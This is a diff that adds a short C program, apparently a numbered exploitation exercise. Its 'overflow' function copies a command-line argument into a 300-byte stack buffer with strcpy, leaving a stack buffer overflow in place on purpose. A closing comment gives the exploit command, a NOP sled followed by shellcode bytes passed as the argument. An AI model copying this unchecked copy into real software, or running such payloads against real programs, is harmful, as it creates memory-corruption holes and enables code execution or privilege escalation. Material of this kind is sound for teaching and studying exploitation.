@@ -1,0 +1,24 @@
+#include <stdlib.h>
+#include <stdio.h>
+#include <string.h>
+
+int overflow(char *buff)
+{
+    	char local[300];
+
+    	strcpy(local, buff);
+
+    	return 0;
+}
+
+int main(int argc, char **argv) {
+    	overflow(argv[1]);
+	printf("\nDone!\n");
+    	return 0;
+}
+
+/**
+
+./q7 `python -c 'print "\x90"*259 + "\x31\xdb\x8d\x43\x17\x99\xcd\x80"'`
+
+*/
